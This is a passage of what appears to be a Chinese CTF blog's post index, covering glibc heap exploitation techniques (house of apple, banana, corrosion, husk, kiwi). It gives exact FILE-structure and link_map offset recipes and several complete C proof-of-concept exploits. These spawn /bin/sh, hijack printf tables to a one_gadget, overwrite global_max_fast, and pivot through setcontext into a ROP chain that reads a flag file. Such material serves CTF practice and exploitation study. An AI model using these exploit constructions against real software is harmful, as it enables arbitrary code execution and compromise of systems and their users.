&amp;&amp; _IO_file_underflow_mmap (fp) == EOF)        /* Nothing available.  _IO_file_underflow_mmap has set the EOF or error       flags as appropriate.  */        return WEOF;    /* There is more in the external.  Convert it.  */    read_stop = (const char *) fp-&gt;_IO_read_ptr;    if (fp-&gt;_wide_data-&gt;_IO_buf_base == NULL)    &#123;        /* Maybe we already have a push back pointer.  */        if (fp-&gt;_wide_data-&gt;_IO_save_base != NULL)        &#123;            free (fp-&gt;_wide_data-&gt;_IO_save_base);            fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;        &#125;        _IO_wdoallocbuf (fp);    &#125;    fp-&gt;_wide_data-&gt;_IO_last_state = fp-&gt;_wide_data-&gt;_IO_state;    fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_read_ptr =        fp-&gt;_wide_data-&gt;_IO_buf_base;    __libio_codecvt_in (cd, &amp;fp-&gt;_wide_data-&gt;_IO_state,                        fp-&gt;_IO_read_ptr, fp-&gt;_IO_read_end,                        &amp;read_stop,                        fp-&gt;_wide_data-&gt;_IO_read_ptr,                        fp-&gt;_wide_data-&gt;_IO_buf_end,                        &amp;fp-&gt;_wide_data-&gt;_IO_read_end);    ......&#125;\n\n需要设置fp-&gt;_flags &amp; _IO_NO_READS == 0，设置fp-&gt;_wide_data-&gt;_IO_read_ptr &gt;= fp-&gt;_wide_data-&gt;_IO_read_end，设置fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end不进入调用，设置fp-&gt;_wide_data-&gt;_IO_buf_base != NULL不进入调用。\n构造方法：\n\n_flags设置为~4\nvtable设置为_IO_wfile_jumps_mmap地址（加减偏移），使其能成功调用_IO_wfile_underflow_mmap即可\n_IO_read_ptr &lt; _IO_read_end，即满足*(fp + 8) &lt; *(fp + 0x10)\n_wide_data保持默认，或者设置为堆地址，假设其地址为A，即满足*(fp + 0xa0) = A\n_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end，即满足*A &gt;= *(A + 8)\n_wide_data-&gt;_IO_buf_base设置为非0，即满足*(A + 0x30) != 0\n_codecvt设置为可控堆地址B，即满足*(fp + 0x98) = B\ncodecvt-&gt;__cd_in.step设置为可控堆地址C，即满足*B = C\ncodecvt-&gt;__cd_in.step-&gt;__shlib_handle设置为0，即满足*C = 0\ncodecvt-&gt;__cd_in.step-&gt;__fct设置为地址D,地址D用于控制rip，即满足*(C + 0x28) = D。当调用到D的时候，此时的rdi为C。如果_wide_data也可控的话，rsi也能控制。\n\n_IO_wdo_write调用链：_IO_new_file_sync=&gt;_IO_do_flush=&gt;_IO_wdo_write=&gt;__libio_codecvt_out=&gt;DL_CALL_FCT=&gt;gs = fp-&gt;_codecvt-&gt;__cd_out.step=&gt;*(gs-&gt;__fct)(gs)\nint    _IO_new_file_sync (FILE *fp)&#123;    ssize_t delta;    int retval = 0;    /*    char* ptr = cur_ptr(); */    if (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)        if (_IO_do_flush(fp)) return EOF;    ......&#125;\n\n满足fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base。\n#define _IO_do_flush(_f) \\  ((_f)-&gt;_mode &lt;= 0                                  \\   ? _IO_do_write(_f, (_f)-&gt;_IO_write_base,                      \\          (_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_base)              \\   : _IO_wdo_write(_f, (_f)-&gt;_wide_data-&gt;_IO_write_base,              \\           ((_f)-&gt;_wide_data-&gt;_IO_write_ptr                  \\            - (_f)-&gt;_wide_data-&gt;_IO_write_base)))\n\n使fp-&gt;_mode &gt; 0。\nint    _IO_wdo_write (FILE *fp, const wchar_t *data, size_t to_do)&#123;    struct _IO_codecvt *cc = fp-&gt;_codecvt;    if (to_do &gt; 0)    &#123;        if (fp-&gt;_IO_write_end == fp-&gt;_IO_write_ptr            &amp;&amp; fp-&gt;_IO_write_end != fp-&gt;_IO_write_base)        &#123;            if (_IO_new_do_write (fp, fp-&gt;_IO_write_base,                                  fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base) == EOF)                return WEOF;        &#125;        ......            /* Now convert from the internal format into the external buffer.  */            result = __libio_codecvt_out (cc, &amp;fp-&gt;_wide_data-&gt;_IO_state,                                          data, data + to_do, &amp;new_data,                                          write_ptr,                                          buf_end,                                          &amp;write_ptr);        ......    &#125;&#125;\n\n满足fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base，然后这个判断需要为假fp-&gt;_IO_write_end == fp-&gt;_IO_write_ptr &amp;&amp; fp-&gt;_IO_write_end != fp-&gt;_IO_write_base。\n构造方式：\n\nvtable设置为_IO_file_jumps地址（加减偏移），使其能成功调用_IO_new_file_sync即可\n_IO_write_ptr &gt; _IO_write_base，即满足*(fp + 0x28) &gt; *(fp + 0x20)\n_mode &gt; 0，即满足(fp + 0xc0) &gt; 0\n_IO_write_end != _IO_write_ptr或者_IO_write_end == _IO_write_base，即满足*(fp + 0x30) != *(fp + 0x28)或者*(fp + 0x30) == *(fp + 0x20)\n_wide_data设置为堆地址，假设地址为A，即满足*(fp + 0xa0) = A\n_wide_data-&gt;_IO_write_ptr &gt;= _wide_data-&gt;_IO_write_base，即满足*(A + 0x20) &gt;= *(A + 0x18)\n_codecvt设置为可控堆地址B，即满足*(fp + 0x98) = B\ncodecvt-&gt;__cd_out.step设置为可控堆地址C，即满足*(B + 0x38) = C\ncodecvt-&gt;__cd_out.step-&gt;__shlib_handle设置为0，即满足*C = 0\ncodecvt-&gt;__cd_out.step-&gt;__fct设置为地址D,地址D用于控制rip，即满足*(C + 0x28) = D。当调用到D的时候，此时的rdi为C。如果_wide_data也可控的话，rsi也能控制。\n\n_IO_wfile_sync调用链：_IO_wfile_sync=&gt;__libio_codecvt_length=&gt;DL_CALL_FCT=&gt;gs = fp-&gt;_codecvt-&gt;__cd_in.step=&gt;*(gs-&gt;__fct)(gs)\nwint_t    _IO_wfile_sync (FILE *fp)&#123;    ssize_t delta;    wint_t retval = 0;    /*    char* ptr = cur_ptr(); */    if (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)        if (_IO_do_flush (fp))            return WEOF;    delta = fp-&gt;_wide_data-&gt;_IO_read_ptr - fp-&gt;_wide_data-&gt;_IO_read_end;    if (delta != 0)    &#123;        /* We have to find out how many bytes we have to go back in the     external buffer.  */        struct _IO_codecvt *cv = fp-&gt;_codecvt;        off64_t new_pos;        int clen = __libio_codecvt_encoding (cv);        if (clen &gt; 0)            /* It is easy, a fixed number of input bytes are used for each       wide character.  */            delta *= clen;        else        &#123;            /* We have to find out the hard way how much to back off.         To do this we determine how much input we needed to         generate the wide characters up to the current reading         position.  */            int nread;            size_t wnread = (fp-&gt;_wide_data-&gt;_IO_read_ptr                             - fp-&gt;_wide_data-&gt;_IO_read_base);            fp-&gt;_wide_data-&gt;_IO_state = fp-&gt;_wide_data-&gt;_IO_last_state;            nread = __libio_codecvt_length (cv, &amp;fp-&gt;_wide_data-&gt;_IO_state,                                            fp-&gt;_IO_read_base,                                            fp-&gt;_IO_read_end, wnread);            ......        &#125;    &#125;&#125;\n\n设置fp-&gt;_wide_data-&gt;_IO_write_ptr &lt;= fp-&gt;_wide_data-&gt;_IO_write_base和fp-&gt;_wide_data-&gt;_IO_read_ptr - fp-&gt;_wide_data-&gt;_IO_read_end != 0。可以看到这里还需要绕过__libio_codecvt_encoding函数\nint__libio_codecvt_encoding (struct _IO_codecvt *codecvt)&#123;  /* See whether the encoding is stateful.  */  if (codecvt-&gt;__cd_in.step-&gt;__stateful)    return -1;  /* Fortunately not.  Now determine the input bytes for the conversion     necessary for each wide character.  */  if (codecvt-&gt;__cd_in.step-&gt;__min_needed_from      != codecvt-&gt;__cd_in.step-&gt;__max_needed_from)    /* Not a constant value.  */    return 0;   return codecvt-&gt;__cd_in.step-&gt;__min_needed_from;&#125;\n\n设置fp-&gt;codecvt-&gt;__cd_in.step-&gt;__stateful != 0即可返回-1。\n构造方式：\n\n_flags设置为~(4 | 0x10)\nvtable设置为_IO_wfile_jumps地址（加减偏移），使其能成功调用_IO_wfile_sync即可\n_wide_data设置为堆地址，假设其地址为A，即满足*(fp + 0xa0) = A\n_wide_data-&gt;_IO_write_ptr &lt;= _wide_data-&gt;_IO_write_base，即满足*(A + 0x20) &lt;= *(A + 0x18)\n_wide_data-&gt;_IO_read_ptr != _wide_data-&gt;_IO_read_end，即满足*A != *(A + 8)\n_codecvt设置为可控堆地址B，即满足*(fp + 0x98) = B\ncodecvt-&gt;__cd_in.step设置为可控堆地址C，即满足*B = C\ncodecvt-&gt;__cd_in.step-&gt;__stateful设置为非0，即满足*(B + 0x58) != 0\ncodecvt-&gt;__cd_in.step-&gt;__shlib_handle设置为0，即满足*C = 0\ncodecvt-&gt;__cd_in.step-&gt;__fct设置为地址D,地址D用于控制rip，即满足*(C + 0x28) = D。当调用到D的时候，此时的rdi为C。如果rsi为&amp;codecvt-&gt;__cd_in.step_data可控。\n\n总结house of apple1主要作用就是实现任意地址写，而我认为house of apple2是最吊的，一定程度上减少了覆盖这个SB pointer_guard。而house of apple3在构造方面要求相对来说较为苛刻。(我还跟个SB一样准备自己写pack_file函数来构造IO_FILE结构体，但是我发现pwntools居然有FileStructure()这个函数可以直接生成)\n\n参考链接：\nhttps://bbs.pediy.com/thread-273832.htm#msg_header_h3_2\nhttps://bbs.pediy.com/thread-273863.htm#msg_header_h3_3\n","categories":["pwn"],"tags":["house of 系列"]},{"title":"house of banana","url":"/2022/03/07/house-of-banana/","content":"\n这个堆利用方式相较于以往的利用方式存在利用目标的不同，这一方式的利用我感觉比较适合与glibc2.31之后，比较之前都可以直接用FSOP，但是在2.31之后FSOP的利用方式就是house of pig不过如果题目禁止了__free_hook之类的被篡改的话也就没法利用了，而house of banana把攻击层面转向了ld\n\n首先，在main执行之后会执行__libc_csu_fini所以我们首先了解这个函数\n如何执行fini-array中的函数void_dl_fini (void)&#123;  /* Lots of fun ahead.  We have to call the destructors for all still     loaded objects, in all namespaces.  The problem is that the ELF     specification now demands that dependencies between the modules     are taken into account.  I.e., the destructor for a module is     called before the ones for any of its dependencies.     To make things more complicated, we cannot simply use the reverse     order of the constructors.  Since the user might have loaded objects     using `dlopen&#x27; there are possibly several other modules with its     dependencies to be taken into account.  Therefore we have to start     determining the order of the modules once again from the beginning.  */  /* We run the destructors of the main namespaces last.  As for the     other namespaces, we pick run the destructors in them in reverse     order of the namespace ID.  */#ifdef SHARED  int do_audit = 0; again:#endif  for (Lmid_t ns = GL(dl_nns) - 1; ns &gt;= 0; --ns)    &#123;      /* Protect against concurrent loads and unloads.  */      __rtld_lock_lock_recursive (GL(dl_load_lock));      unsigned int nloaded = GL(dl_ns)[ns]._ns_nloaded;      /* No need to do anything for empty namespaces or those used for\t auditing DSOs.  */      if (nloaded == 0#ifdef SHARED\t  || GL(dl_ns)[ns]._ns_loaded-&gt;l_auditing != do_audit#endif\t  )\t__rtld_lock_unlock_recursive (GL(dl_load_lock));      else\t&#123;\t  /* Now we can allocate an array to hold all the pointers and\t     copy the pointers in.  */\t  struct link_map *maps[nloaded];\t  unsigned int i;\t  struct link_map *l;\t  assert (nloaded != 0 || GL(dl_ns)[ns]._ns_loaded == NULL);\t  for (l = GL(dl_ns)[ns]._ns_loaded, i = 0; l != NULL; l = l-&gt;l_next)\t    /* Do not handle ld.so in secondary namespaces.  */\t    if (l == l-&gt;l_real)\t      &#123;\t\tassert (i &lt; nloaded);\t\tmaps[i] = l;\t\tl-&gt;l_idx = i;\t\t++i;\t\t/* Bump l_direct_opencount of all objects so that they\t\t   are not dlclose()ed from underneath us.  */\t\t++l-&gt;l_direct_opencount;\t      &#125;\t  assert (ns != LM_ID_BASE || i == nloaded);\t  assert (ns == LM_ID_BASE || i == nloaded || i == nloaded - 1);\t  unsigned int nmaps = i;\t  /* Now we have to do the sorting.  We can skip looking for the\t     binary itself which is at the front of the search list for\t     the main namespace.  */\t  _dl_sort_maps (maps + (ns == LM_ID_BASE), nmaps - (ns == LM_ID_BASE),\t\t\t NULL, true);\t  /* We do not rely on the linked list of loaded object anymore\t     from this point on.  We have our own list here (maps).  The\t     various members of this list cannot vanish since the open\t     count is too high and will be decremented in this loop.  So\t     we release the lock so that some code which might be called\t     from a destructor can directly or indirectly access the\t     lock.  */\t  __rtld_lock_unlock_recursive (GL(dl_load_lock));\t  /* &#x27;maps&#x27; now contains the objects in the right order.  Now\t     call the destructors.  We have to process this array from\t     the front.  */\t  for (i = 0; i &lt; nmaps; ++i)\t    &#123;\t      struct link_map *l = maps[i];\t      if (l-&gt;l_init_called)\t\t&#123;\t\t  /* Make sure nothing happens if we are called twice.  */\t\t  l-&gt;l_init_called = 0;\t\t  /* Is there a destructor function?  */\t\t  if (l-&gt;l_info[DT_FINI_ARRAY] != NULL\t\t      || l-&gt;l_info[DT_FINI] != NULL)\t\t    &#123;\t\t      /* When debugging print a message first.  */\t\t      if (__builtin_expect (GLRO(dl_debug_mask)\t\t\t\t\t    &amp; DL_DEBUG_IMPCALLS, 0))\t\t\t_dl_debug_printf (&quot;\\ncalling fini: %s [%lu]\\n\\n&quot;,\t\t\t\t\t  DSO_FILENAME (l-&gt;l_name),\t\t\t\t\t  ns);\t\t      /* First see whether an array is given.  */\t\t      if (l-&gt;l_info[DT_FINI_ARRAY] != NULL)\t\t\t&#123;\t\t\t  ElfW(Addr) *array =\t\t\t    (ElfW(Addr) *) (l-&gt;l_addr\t\t\t\t\t    + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);\t\t\t  unsigned int i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val\t\t\t\t\t    / sizeof (ElfW(Addr)));\t\t\t  while (i-- &gt; 0)\t\t\t    ((fini_t) array[i]) ();\t\t\t&#125;\t\t      /* Next try the old-style destructor.  */\t\t      if (l-&gt;l_info[DT_FINI] != NULL)\t\t\tDL_CALL_DT_FINI\t\t\t  (l, l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr);\t\t    &#125;... ...\n\n可以看到最后调用了array[i]()，不过我们需要控制array的话就需要进一步知道这是什么。\n利用原理for (l = GL(dl_ns)[ns]._ns_loaded, i = 0; l != NULL; l = l-&gt;l_next)    /* Do not handle ld.so in secondary namespaces.  */    if (l == l-&gt;l_real)    &#123;        assert (i &lt; nloaded);        maps[i] = l;        l-&gt;l_idx = i;        ++i;        /* Bump l_direct_opencount of all objects so that they\t\t   are not dlclose()ed from underneath us.  */        ++l-&gt;l_direct_opencount;    &#125;\n\n可以看到下面的其实是和这一部分有关的\n其中的GL就是\n#  define GL(name) _rtld_global._##name\n\n下面就是_rtld_global这个结构体，但是这个结构体相对比较复杂\nstruct rtld_global&#123;#endif  /* Don&#x27;t change the order of the following elements.  &#x27;dl_loaded&#x27;     must remain the first element.  Forever.  *//* Non-shared code has no support for multiple namespaces.  */#ifdef SHARED# define DL_NNS 16#else# define DL_NNS 1#endif  EXTERN struct link_namespaces  &#123;    /* A pointer to the map for the main map.  */    struct link_map *_ns_loaded;    /* Number of object in the _dl_loaded list.  */    unsigned int _ns_nloaded;    /* Direct pointer to the searchlist of the main object.  */    struct r_scope_elem *_ns_main_searchlist;    /* This is zero at program start to signal that the global scope map is       allocated by rtld.  Later it keeps the size of the map.  It might be       reset if in _dl_close if the last global object is removed.  */    unsigned int _ns_global_scope_alloc;    /* During dlopen, this is the number of objects that still need to       be added to the global scope map.  It has to be taken into       account when resizing the map, for future map additions after       recursive dlopen calls from ELF constructors.  */    unsigned int _ns_global_scope_pending_adds;    /* Search table for unique objects.  */    struct unique_sym_table    &#123;      __rtld_lock_define_recursive (, lock)      struct unique_sym      &#123;\tuint32_t hashval;\tconst char *name;\tconst ElfW(Sym) *sym;\tconst struct link_map *map;      &#125; *entries;      size_t size;      size_t n_elements;      void (*free) (void *);    &#125; _ns_unique_sym_table;    /* Keep track of changes to each namespace&#x27; list.  */    struct r_debug _ns_debug;  &#125; _dl_ns[DL_NNS];... ...\n\n通过上面的for循环可以看到其实我们利用的也只是其中的dl_ns部分，所以下面的我就省略了。然后其中又是另一个结构体这里就不继续深挖了。\n这里根据上面的内容可以看出来的是 array = (l-&gt;l_addr + l-&gt;l_info[DT_FINI_ARRAY\\]-&gt;d_un.d_ptr);\n再根据上面的for循环最后使用的是l=l-&gt;next可以看出来其实这是一个存在链表操作的结构，所以我们只需要伪造链表当中的其中一个结构体就行。\n再次看到这个赋值操作：\nfor (l = GL(dl_ns)[ns]._ns_loaded, i = 0; l != NULL; l = l-&gt;l_next)    /* Do not handle ld.so in secondary namespaces.  */    if (l == l-&gt;l_real)    &#123;        assert (i &lt; nloaded);        maps[i] = l;        l-&gt;l_idx = i;        ++i;        /* Bump l_direct_opencount of all objects so that they\t\t   are not dlclose()ed from underneath us.  */        ++l-&gt;l_direct_opencount;    &#125;assert (ns != LM_ID_BASE || i == nloaded);assert (ns == LM_ID_BASE || i == nloaded || i == nloaded - 1);\n\n这里的maps需要的是4个元素，所以我们劫持第三个l-&gt;next到我们伪造的结构当中即可，并且可以绕过下面两个assert\n\n所以我们利用distance求出偏移然后修改掉&amp;_rtld_global-0x1e048的地址到我们伪造的结构体就行，另外在这一代码当中存在一个if判断，需要绕过这一if判断\n\n\n所以我们只需要在fake+0x28=fake就可\n现在的目标就是进行伪造，能够顺利的执行到最后\nif (l-&gt;l_init_called)&#123;    /* Make sure nothing happens if we are called twice.  */    l-&gt;l_init_called = 0;    /* Is there a destructor function?  */    if (l-&gt;l_info[DT_FINI_ARRAY] != NULL        || l-&gt;l_info[DT_FINI] != NULL)    &#123;        /* When debugging print a message first.  */        if (__builtin_expect (GLRO(dl_debug_mask)                              &amp; DL_DEBUG_IMPCALLS, 0))            _dl_debug_printf (&quot;\\ncalling fini: %s [%lu]\\n\\n&quot;,                              DSO_FILENAME (l-&gt;l_name),                              ns);        /* First see whether an array is given.  */        if (l-&gt;l_info[DT_FINI_ARRAY] != NULL)        &#123;            ElfW(Addr) *array =                (ElfW(Addr) *) (l-&gt;l_addr                                + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);            unsigned int i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val                              / sizeof (ElfW(Addr)));            while (i-- &gt; 0)                ((fini_t) array[i]) ();        &#125;\n\n可以看到这里存在的是三个if判断\n\n首先是l_init_called可以看到他们之间的距离为0x314然后地址上的值为0x1c，所以只需要fake+0x314=0x1c即可绕过。(在glibc2.31当中的距离为0x31c，上面没注意使用的是glibc2.27下面改用2.31)\n随后就是下面两个if语句，fake-&gt;l_info[26]和fake-&gt;l_info[28]!=NULL即可绕过，然后可以看到下面这两个其实直接控制了，array和i的值，所以我们需要利用好这两个。\nElfW(Addr) *array =\t\t\t    (ElfW(Addr) *) (l-&gt;l_addr\t\t\t\t\t    + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);\t\t\t  unsigned int i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val\t\t\t\t\t    / sizeof (ElfW(Addr)));------#define\tDT_FINI_ARRAY\t26\t\t/* Array with addresses of fini fct */#define\tDT_FINI_ARRAYSZ\t28\t\t/* Size in bytes of DT_FINI_ARRAY */\n\n\n\n查看info的结构体，这里的伪造方式我直接引用我参考的博客来写\n在fake+0x110处写入fake+0x40，然后在fake+0x48写入fake+0x58然后在fake+0x58写入shell\n在fake+0x120出写入fake+0x48，在fake+0x50处写入8\n总结利用方式首先劫持结构体：\n​    &amp;(_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next) = fake\n绕过检测：\n​    fake+0x28 = fake\n​    fake+0x31c = 0x1c\n控制array：\n​    fake+0x110 = fake+0x40\n​    fake+0x48 = fake+0x58\n​    fake+0x58 = shell\n控制i：\n​    fake+0x120 = fake+0x48\n​    fake+0x50 = 8\n需要注意的\n上面说的maps需要四个元素，然后我懒得调试就没在glibc2.31下调试，所以就直接写poc但是存在问题，后面调试发现其实需要的是7个\nunsigned int nloaded = GL(dl_ns)[ns]._ns_nloaded;\n\n所以如果是在glibc2.31下我们劫持结构体的方式应该变为：\n​    &amp;(_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next-&gt;l_next-&gt;l_next-&gt;l_next) = fake\n后续的内容一致\npoc下面是我自己写的poc，我将large bin attack的步骤省略了：\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;void shell()&#123;    system(&quot;/bin/sh&quot;);&#125;int main()&#123;    uint64_t *target;    uint64_t *fake;    uint64_t main_arena_96;    uint64_t *rtld_global_addr;    fake = (uint64_t *)malloc(0x420);    malloc(0x10);    free(fake);    main_arena_96 = *(uint64_t *)fake;    rtld_global_addr = (uint64_t *)main_arena_96 + (0x259480 / 8);    target = (uint64_t *)rtld_global_addr - 0x4b128 / 8;    fake = (uint64_t *)malloc(0x420);    memset((void *)fake, 0, 0x420);    *(uint64_t *)target = (uint64_t)fake;    *(uint64_t *)(fake + 0x28 / 8) = fake;    *(uint64_t *)(fake + 0x31c / 8) = 0x1c00000000;    *(uint64_t *)(fake + 0x110 / 8) = fake + 0x40 / 8;    *(uint64_t *)(fake + 0x48 / 8) = fake + 0x58 / 8;    *(uint64_t *)(fake + 0x58 / 8) = (uint64_t)shell;    *(uint64_t *)(fake + 0x120 / 8) = fake + 0x48 / 8;    *(uint64_t *)(fake + 0x50 / 8) = 8;    return 0;&#125;\n\n\n参考博客https://giles-one.github.io/2021/10/04/house-of-%E7%B3%BB%E5%88%97%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/\n大佬这里最后的poc在除了上面我说的之外存在还一点小问题，应该是忘了给每个地址除以8\n","categories":["pwn"],"tags":["house of 系列","fini","house of banana"]},{"title":"house of corrosion/husk/kiwi","url":"/2022/03/11/house-of-corrosion-husk-kiwi/","content":"这篇文章过后估计就会慢下来更新了，内核一直拖着没学，再就是自己逆向能力很差所以也打算多练点题了，因为时间关系这篇文章我就少一点源码的讲解了。\nhouse of corrosion在large bin attack和tcache stashing unlink当中我们可以实现任意地址写入很大的数，那么我们写入这个数的作用是什么呢？\n这一利用方式就是通过其他攻击方式修改global_max_fast的值为一个很大的值，这就导致我们生成的chunk为一个fast bin chunk，然而chunk在进入fast bin时是遵循一定规律的，free时会根据size进入到相应的地址，这也就促使我们可以进一步利用了。\n首先这里的计算公式为：\nchunk size = ((target - main_arena) * 2) - 0x10\n\n第一种方式也就是在fastbinY后的任意地址写入堆地址\n\n当我们取出这个chunk时，会将fd指针留在相应的位置，所以如果存在UAF就可以更进一步的实现任意地址写任意值\n\n下面是以上两个方法的poc可以直接在glibc2.31下使用\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdint.h&gt;#include &lt;string.h&gt;#define offset2size(ofs) ((ofs)*2 - 0x10)#define MAIN_ARENA 0x1ebb80#define MAIN_ARENA_DELTA 0x60#define GLOBAL_MAX_FAST 0x1eeb80#define PRINTF_FUNCTABLE 0x1f0ff8#define PRINTF_ARGINFO 0x1f1350#define ONE_GADGET 0xe6c81int main(void)&#123;    unsigned long libc_base;    char *ptr0;    char *ptr1;    char *ptr2;    setbuf(stdout, NULL);    ptr0 = malloc(0x500);    ptr1 = malloc(offset2size(PRINTF_FUNCTABLE - MAIN_ARENA));    ptr2 = malloc(offset2size(PRINTF_ARGINFO - MAIN_ARENA));    free(ptr0);    libc_base = *(unsigned long *)ptr0 - MAIN_ARENA - MAIN_ARENA_DELTA;    uint64_t *aaa = libc_base + GLOBAL_MAX_FAST;    *aaa = ptr0;    free(ptr1);    free(ptr2);    strcpy(ptr1, &quot;aaaaaaaa&quot;);    malloc(offset2size(PRINTF_FUNCTABLE - MAIN_ARENA));    return 0;&#125;\n\nhouse of husk这一堆利用主要针对的是printf的利用链，具体链子不再关心，我们的最终效果是劫持__printf_function_table和__printf_arginfo_table到我们堆地址，然后伪造格式化字符串对应的地址的值one_gadget\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdint.h&gt;#define offset2size(ofs) ((ofs) * 2 - 0x10)#define MAIN_ARENA       0x1ebb80#define MAIN_ARENA_DELTA 0x60#define GLOBAL_MAX_FAST  0x1eeb80#define PRINTF_FUNCTABLE 0x1f0ff8#define PRINTF_ARGINFO   0x1f1350#define ONE_GADGET       0xe6c81int main (void)&#123;  unsigned long libc_base;  char *a[10];  setbuf(stdout, NULL);  a[0] = malloc(0x500);  a[1] = malloc(offset2size(PRINTF_FUNCTABLE - MAIN_ARENA));  a[2] = malloc(offset2size(PRINTF_ARGINFO - MAIN_ARENA));  a[3] = malloc(0x500);  free(a[0]);  libc_base = *(unsigned long*)a[0] - MAIN_ARENA - MAIN_ARENA_DELTA;  printf(&quot;libc @ 0x%lxn&quot;, libc_base);  *(unsigned long*)(a[2] + (&#x27;X&#x27; - 2) * 8) = libc_base + ONE_GADGET;  uint64_t *aaa=libc_base+GLOBAL_MAX_FAST;  *aaa=a[0];  free(a[1]);  free(a[2]);  printf(&quot;%X&quot;, 0);  return 0;&#125;\n\n最终实现的就是污染掉__printf_arginfo_table但是另一个table也不能为null所以也伪造上，不过不需要弄什么数据。\n具体过程大家可以去调试，这里用到了house of corrosion\nhouse of kiwi这一调用链通过触发__malloc_assert，调用fflush进而调用stderr中的_IO_file_jumps中的sync指针\n触发的方式也会有很多种，这里常用的就是在验证top chunk中的一种，house of force这篇文章中利用这是需要绕过这一assert，可以去看一下是什么assert\ngdb调试assert时发现fflush调用的是位于_IO_file_jumps中的_IO_file_sync指针,且观察发现RDX寄存器的值为IO_helper_jumps指针,多次调试发现RDX始终是一个固定的地址\n如果存在一个任意写,通过修改 _IO_file_jumps + 0x60的_IO_file_sync指针为setcontext+61修改IO_helper_jumps + 0xA0 and 0xA8分别为可迁移的存放有ROP的位置和ret指令的gadget位置,则可以进行栈迁移\n\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;assert.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;linux/filter.h&gt;#include &lt;linux/seccomp.h&gt;#define pop_rdi_ret libc_base + 0x000000000002858F#define pop_rdx_r12 libc_base + 0x0000000000114161#define pop_rsi_ret libc_base + 0x000000000002AC3F#define pop_rax_ret libc_base + 0x0000000000045580#define syscall_ret libc_base + 0x00000000000611EA#define ret pop_rdi_ret+1size_t libc_base;size_t ROP[0x30];char FLAG[0x100] = &quot;./flag.txt\\x00&quot;;void sandbox()&#123;    prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);    struct sock_filter sfi[] =&#123;        &#123;0x20,0x00,0x00,0x00000004&#125;,        &#123;0x15,0x00,0x05,0xC000003E&#125;,        &#123;0x20,0x00,0x00,0x00000000&#125;,        &#123;0x35,0x00,0x01,0x40000000&#125;,        &#123;0x15,0x00,0x02,0xFFFFFFFF&#125;,        &#123;0x15,0x01,0x00,0x0000003B&#125;,        &#123;0x06,0x00,0x00,0x7FFF0000&#125;,        &#123;0x06,0x00,0x00,0x00000000&#125;    &#125;;    struct sock_fprog sfp = &#123;8, sfi&#125;;    prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;sfp);&#125;void setROP()&#123;    uint32_t i = 0;    ROP[i++] = pop_rax_ret;    ROP[i++] = 2;    ROP[i++] = pop_rdi_ret;    ROP[i++] = (size_t)FLAG;    ROP[i++] = pop_rsi_ret;    ROP[i++] = 0;    ROP[i++] = syscall_ret;    ROP[i++] = pop_rdi_ret;    ROP[i++] = 3;    ROP[i++] = pop_rdx_r12;    ROP[i++] = 0x100;    ROP[i++] = 0;    ROP[i++] = pop_rsi_ret;    ROP[i++] = (size_t)(FLAG + 0x10);    ROP[i++] = (size_t)read;    ROP[i++] = pop_rdi_ret;    ROP[i++] = 1;    ROP[i++] = (size_t)write;&#125;int main() &#123;    setvbuf(stdin,0LL,2,0LL);    setvbuf(stdout,0LL,2,0LL);    setvbuf(stderr,0LL,2,0LL);    sandbox();    libc_base  = ((size_t)setvbuf) - 0x81630;    printf(&quot;LIBC:\\t%#lx\\n&quot;,libc_base);    size_t magic_gadget = libc_base + 0x53030 + 61; // setcontext + 61    size_t IO_helper = libc_base + 0x1E48C0; // _IO_hel    per_jumps;    size_t SYNC = libc_base + 0x1E5520; // sync pointer in _IO_file_jumps    setROP();    *((size_t*)IO_helper + 0xA0/8) = ROP; // 设置rsp    *((size_t*)IO_helper + 0xA8/8) = ret; // 设置rcx 即 程序setcontext运行完后会首先调用的指令地址    *((size_t*)SYNC) = magic_gadget; // 设置fflush(stderr)中调用的指令地址    // 触发assert断言,通过large bin chunk的size中flag位修改,或者top chunk的inuse写0等方法可以触发assert    size_t *top_size = (size_t*)((char*)malloc(0x10) + 0x18);    *top_size = (*top_size)&amp;0xFFE; // top_chunk size改小并将inuse写0,当top chunk不足的时候,会进入sysmalloc中,其中有个判断top_chunk的size中inuse位是否存在    malloc(0x1000); // 触发assert    _exit(-1);&#125;\n\n可以看到就只是劫持了sync为setcontext+61然后就是通过IO_helper控制rdx进而控制其他所有寄存器，实现ROP\n例题的话，后续会更一篇NULL_FxCK，因为用的Glibc为2.32所以会出现一系列问题，所以不增加这篇文章篇幅了\n\n参考链接：https://www.anquanke.com/post/id/235598\n","categories":["pwn"],"tags":["house of 系列"]},{"title":"house of 